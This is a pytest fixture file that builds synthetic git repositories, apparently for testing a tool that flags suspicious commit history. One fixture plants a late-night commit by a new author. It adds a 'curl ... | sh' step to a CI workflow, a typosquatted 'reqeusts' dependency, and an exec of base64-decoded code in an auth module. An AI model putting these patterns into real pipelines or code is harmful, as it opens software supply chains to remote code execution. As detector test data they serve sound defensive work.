"""Synthetic git repositories used across the test-suite."""

from __future__ import annotations

import datetime as dt
import subprocess
from pathlib import Path

import pytest

BASE = dt.datetime(2024, 1, 8, 10, 0, 0, tzinfo=dt.timezone.utc)


def git(repo: Path, *args: str, env: dict[str, str] | None = None) -> str:
    proc = subprocess.run(
        ["git", "-C", str(repo), *args],
        capture_output=True,
        text=True,
        check=True,
        env={**_base_env(), **(env or {})},
    )
    return proc.stdout


def _base_env() -> dict[str, str]:
    import os

    env = dict(os.environ)
    env.update(
        {
            "GIT_CONFIG_GLOBAL": "/dev/null",
            "GIT_CONFIG_SYSTEM": "/dev/null",
            "GIT_TERMINAL_PROMPT": "0",
        }
    )
    return env


def init_repo(path: Path) -> Path:
    path.mkdir(parents=True, exist_ok=True)
    git(path, "init", "-q", "-b", "main")
    git(path, "config", "user.name", "Test")
    git(path, "config", "user.email", "test@example.com")
    git(path, "config", "commit.gpgsign", "false")
    return path


def commit(
    repo: Path,
    files: dict[str, str],
    *,
    author: str,
    email: str,
    when: dt.datetime,
    message: str = "change",
) -> str:
    for rel, content in files.items():
        target = repo / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding="utf-8")
    git(repo, "add", "-A")
    stamp = when.isoformat()
    env = {
        "GIT_AUTHOR_NAME": author,
        "GIT_AUTHOR_EMAIL": email,
        "GIT_COMMITTER_NAME": author,
        "GIT_COMMITTER_EMAIL": email,
        "GIT_AUTHOR_DATE": stamp,
        "GIT_COMMITTER_DATE": stamp,
    }
    git(repo, "commit", "-q", "-m", message, env=env)
    return git(repo, "rev-parse", "HEAD").strip()


@pytest.fixture
def tiny_repo(tmp_path: Path) -> Path:
    """Two commits, one author — enough to exercise parsing."""
    repo = init_repo(tmp_path / "tiny")
    commit(
        repo,
        {"README.md": "hello\n", "src/app.py": "print('hi')\n"},
        author="Ana",
        email="ana@example.com",
        when=BASE,
        message="initial commit",
    )
    commit(
        repo,
        {"src/app.py": "print('hi')\nprint('there')\n"},
        author="Ana",
        email="ana@example.com",
        when=BASE + dt.timedelta(days=1),
        message="extend app",
    )
    return repo


@pytest.fixture
def planted_repo(tmp_path: Path) -> Path:
    """A repo with normal development plus deliberately planted anomalies.

    Planted signals:
      * a first-time author committing at 03:12 to CI + auth + requirements
      * the typosquatted dependency ``reqeusts``
      * strong co-change between ``src/api/routes.py`` and ``vendor/tracker.js``
      * ``.github/workflows/release.yml`` owned by exactly one author
    """
    repo = init_repo(tmp_path / "planted")
    now = BASE

    commit(
        repo,
        {
            "README.md": "# demo\n",
            "requirements.txt": "requests==2.31.0\nflask==3.0.0\n",
            "src/api/routes.py": "def index():\n    return 'ok'\n",
            "src/api/serializers.py": "def dump(x):\n    return x\n",
            "src/auth/session.py": "def login(user):\n    return user\n",
            "src/core/util.py": "def noop():\n    pass\n",
            "vendor/tracker.js": "export const track = () => {};\n",
            "docs/guide.md": "docs\n",
            ".github/workflows/release.yml": "name: release\non: push\n",
        },
        author="Ana",
        email="ana@example.com",
        when=now,
        message="initial commit",
    )

    # Ana and Ben do ordinary, localised work for several weeks.
    for index in range(1, 13):
        now = now + dt.timedelta(days=2, hours=1)
        commit(
            repo,
            {
                "src/api/routes.py": "def index():\n    return 'ok'\n" + f"# rev {index}\n",
                "src/api/serializers.py": "def dump(x):\n    return x\n" + f"# rev {index}\n",
            },
            author="Ana",
            email="ana@example.com",
            when=now.replace(hour=10),
            message=f"api work {index}",
        )
        now = now + dt.timedelta(days=1)
        commit(
            repo,
            {
                "src/core/util.py": "def noop():\n    pass\n" + f"# rev {index}\n",
                "docs/guide.md": "docs\n" + f"line {index}\n",
            },
            author="Ben",
            email="ben@example.com",
            when=now.replace(hour=14),
            message=f"core work {index}",
        )

    # Planted: unexplained coupling between an API module and vendored JS.
    for index in range(4):
        now = now + dt.timedelta(days=3)
        commit(
            repo,
            {
                "src/api/routes.py": "def index():\n    return 'ok'\n" + f"# coupled {index}\n",
                "vendor/tracker.js": "export const track = () => {};\n" + f"// coupled {index}\n",
            },
            author="Ana",
            email="ana@example.com",
            when=now.replace(hour=11),
            message=f"tracking sync {index}",
        )

    # Planted: a first-time author, at 03:12, hitting CI + auth + dependencies,
    # adding a typosquatted package and a base64-decoding payload.
    now = now + dt.timedelta(days=2)
    commit(
        repo,
        {
            ".github/workflows/release.yml": (
                "name: release\non: push\njobs:\n  build:\n"
                "    runs-on: ubuntu-latest\n    steps:\n"
                "      - run: curl https://cdn.example.net/setup.sh | sh\n"
            ),
            "requirements.txt": "requests==2.31.0\nflask==3.0.0\nreqeusts==9.9.9\n",
            "src/auth/session.py": (
                "import base64\n\n"
                "def login(user):\n"
                "    exec(base64.b64decode('cHJpbnQoMSk='))\n"
                "    return user\n"
            ),
        },
        author="Contractor",
        email="contractor@vendor.example",
        when=now.replace(hour=3, minute=12),
        message="ci: speed up release pipeline",
    )
    return repo
